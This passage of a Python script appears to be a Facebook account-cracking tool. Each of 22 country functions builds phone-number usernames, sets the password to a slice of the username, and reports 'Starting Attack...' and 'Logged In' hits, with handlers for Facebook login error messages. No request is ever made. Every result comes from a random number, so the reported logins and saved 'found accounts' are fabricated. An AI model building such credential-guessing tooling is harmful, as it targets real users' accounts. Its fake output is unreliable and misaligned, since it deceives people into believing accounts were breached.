                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def NIG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Nigeria',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(nig)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[4:10]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def GERM():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Germany',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(germ)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def MAL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Malaysia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(mal)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                
                
                
                
                
                if CC=='01' or CC=='1':
                    IND()
                    sys.exit()
                if CC=='02' or CC=='2':
                    US()
                    sys.exit()
                if CC=='03' or CC=='3':
                    CHIN()
                    sys.exit()
                if CC=='04' or CC=='4':
                    INDO()
                    sys.exit()
                    
                if CC=='05' or CC=='5':
                    BRA()
                    sys.exit()
                    
                if CC=='06' or CC=='6':
                    MEX()
                    sys.exit()
                elif CC=='07' or CC=='7':
                    PHIL()
                    sys.exit()
                elif CC=='08' or CC=='8':
                    VT()
                    sys.exit()
                elif CC=='09' or CC=='9':
                    THAI()
                    sys.exit()
                
                elif CC=='10':
                    EG()
                    sys.exit()
                elif CC=='11':
                    BD()
                    sys.exit()
                elif CC=='12':
                    PAK()
                    sys.exit()
                elif CC=='13':
                    COLOM()
                    sys.exit()
                elif CC=='14':
                    UK()
                    sys.exit()
                elif CC=='15':
                    RUS()
                    sys.exit()
                elif CC=='16':
                    TURK()
                    sys.exit()
                elif CC=='17':
                    FR()
                    sys.exit()
                elif CC=='18':
                    ARG()
                    sys.exit()
                elif CC=='19':
                    ITAL()
                    sys.exit()
                elif CC=='20':
                    NIG()
                    sys.exit()
                elif CC=='21':
                    GERM()
                    sys.exit()
                elif CC=='22':
                    MAL()
                    sys.exit()
                else:
                    print(colored('[!] Invalid Option','red'))
                    time.sleep(1)
                    Country()
                
            Country()
            
        def Attack3():
            
            def Country():
                
                
                os.system('clear')
                print(banner)
                col1=['red','blue','yellow','green','cyan']
                color1=random.choice(col1)
                print(colored(f'''{59*equal}\n{59*equal}
                [01]     India
                [02]     United States
                [03]     China
                [04]     Indonesia
                [05]     Brazil
                [06] Mexico
                [07] Philippines
                [08] Vietnam
                [09]         Thailand
                [10]    Egypt
                [11]            Bangladesh
                [12]            Pakistan
                [13]        Colombia
                [14]    United Kingdom
                [15]    Russia
                [16]    Turkey
                [17]            France
                [18]            Argentina
                [19]        Italy
                [20]        Nigeria
                [21]    Germany
                [22]    Malaysia\n{59*equal}\n[00] Back Menu\n{59*equal}''',f'{color1}'))
                C=colored('Country','red',attrs=['bold'])
                CC=input(f'{C}>>')
                col3=['red','blue','yellow','green','cyan','white']
                color3=random.choice(col3)
                if CC=='00':
                    time.sleep(0.5)
                    Level()
                
                def IND():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('India',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(ind)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def US():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('United State',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(us)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[2:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def CHIN():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('China',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
